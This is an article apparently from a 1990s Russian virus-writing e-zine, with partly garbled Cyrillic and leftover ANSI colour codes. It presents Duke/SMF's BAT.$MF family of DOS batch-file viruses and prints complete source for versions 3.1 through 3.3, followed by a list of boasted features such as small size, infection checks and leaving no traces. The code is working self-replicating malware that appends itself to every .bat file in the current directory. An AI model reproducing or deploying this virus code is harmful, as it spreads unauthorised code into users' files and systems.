
[0;1;35m                                D V L  # 2

[33m                         ������⢮ ����ᮢ BAT.$MF
                              (c) by Duke/SMF

[34m
���஬ ��� ����ᮢ �⮣� ᥬ���⢠ ���� Duke/SMF.
������� ����ᮢ �� ���ᨨ �ந�������� �� ᫥���饬� �ࠢ���:
v1.x [37m- ������ � ��⠢���� ASM'� ��� �ਯ⮢
[34mv2.x [37m- ������쮭 ������
[34mv3.x [37m- ����⪨ ������� ᠬ� ���⪨� ��ࠧ���᪨� �����,
       �ᯮ�짮����� find
[34mv4.x [37m- ������-�ࢨ
[34mv5.x [37m- ��ࠧ���᪨� ������, �ᯮ�짮����� type
�� �����騩 ������ � ᥬ���⢮ �室�� ����� 10 ����ᮢ.

[36m********************************************************************
[31m��� �����     : BAT.$MF v3.1
��� ᮧ�����  : 06.09.98
����� �����   : 350 ���� (� ��⮬ ������ ��ப � ���� 䠩��,
                 ��� "��㣫��" �����)
[36m===== Cut here =====
[0;37m@echo off
if "%1=="$MF goto $MFz
echo. >$MF.bat
echo @echo off>>$MF.bat
find "$MF">$MF.bat
echo echo on>>$MF.bat
for %%b in (*.bat) do call $MF.bat $MF %%b
del $MF.bat>nul
goto $MFe
:$MFz
if "%2=="autoexec.bat goto $MFe
find "$MF"nul
if not errorlevel 1 goto $MFe
type $MF.bat>>%2
rem BAT.$MF 3.1 by Duke/$MF
:$MFe
echo on

[1;36m===== Cut here =====
[36m********************************************************************
[31m��� �����     : BAT.$MF v3.2
��� ᮧ�����  : 10.09.98
����� �����   : 278 ����
����� 䠩��� : 282 ���� (�� ��� ���������� ���� ��� #10#13)
[36m===== Cut here =====
[0;37m@echo off
if "%1=="@ goto $&z
echo.>$&.bat
echo @echo off>>$&.bat
find "$&">$&.bat
for %%b in (*.bat) do call $&.bat @ %%b
del $&.bat
goto $&
:$&z [$MF 3.2, Duke/SMF]
if "%2=="autoexec.bat goto $&
find "$&"nul
if not errorlevel 1 goto $&
type $&.bat>>%2
:$&
[1;36m===== Cut here =====
[36m********************************************************************
[31m��� �����     : BAT.$MF v3.3
��� ᮧ�����  : 07.10.98
����� �����   : 245 ����
����� 䠩��� : 249 ���� (�� ��� ���������� ���� ��� #10#13)

[34m��� ����� ��⥭��� �� ������ "���� �����쪨� � ��� BAT-�����,
����ᠭ�� ⮫쪮 �� DOS-��������" :)
[36m===== Cut here =====
[0;37m@echo off %$&%
if "%1=="@ goto $&z
echo.>$&.bat
find "$&">$&.bat
for %%b in (*.bat) do call $&.bat @ %%b
del $&.bat
goto $&
:$&z [$MF 3.3,Duke/SMF]
if "%2=="autoexec.bat goto $&
find "$&"nul
if errorlevel 1 type $&.bat>>%2
:$&
[1;36m===== Cut here =====
[36m********************************************************************

[34m�२����⢠ ����ᮢ ᥬ���⢠ BAT.SMF v3.x ��� ��㣨�� BAT-����ᠬ�:
[37m
  1. �� ᮤ�ঠ� ��⠢�� �� �ᥬ���� - ⮫쪮 DOS �������!
  2. ����� ����� ����ᮢ - 350 � 278 ����. �� ���� �� ᠬ�� �����쪨�
     BAT-����ᮢ � ���!
  3. �஢�ઠ �� ����୮� ��ࠦ����.
  4. �� �뤠�� ����஭��� �����ᥩ �� ��࠭.
  5. �� ��⠢���� ��᫥ ᥡ� ���㦭�� 䠩���.
  6. ��ࠦ���� 䠩�� ��࠭��� ������ ࠡ��ᯮᮡ�����.
  7. ��⮬�� ����ᮢ ࠡ��ᯮᮡ�� �� ��� ����������.
  8. �஢���� � �� ��ࠦ��� AUTOEXEC.BAT
  9. ������ �� ������ 䠩�� � �� �ॡ��� ���⠫��樨.
 10. � ������ �ᯮ������� ।�� ������騥�� ��⪨.

********************************************************************

[34m���� �ࠪ���⨪� ����ᮢ ᥬ���⢠ BAT.SMF v3.x :
[37m
�������, 䠩����, ��ࠧ���᪨� BAT-������. ��� ࠧ��������  �ᯮ�����
������� FIND. ��ࠦ��� BAT-䠩�� � ⥪�饬 ��⠫���. ��ࠦ����  �ந������-
�� � ����� 䠩��. �� ��ࠦ��� 䠩� autoexec.bat (�� ��稭� ��  �����饭��
�� �� ����㧪� ��⥬� �㫥���� ��ࠬ��� ���������  ��ப�).  ��  �����-
�⢨� �⨫��� FIND � ��⠫���� PATH ������� ���४⭮ ࠡ����. �� �।-
�⠢����� ������ ࠡ���� �� ������ �������, 㬥��襭��  �����  �  �����
������ �ந�室�� �� ��� ��⨬���樨 ����, � �� � ��� ������.

  ��室�� ⥪��� �� ����� ����� � 䠩�� "dvl2-04a.zip"
[1;35m                            The End of File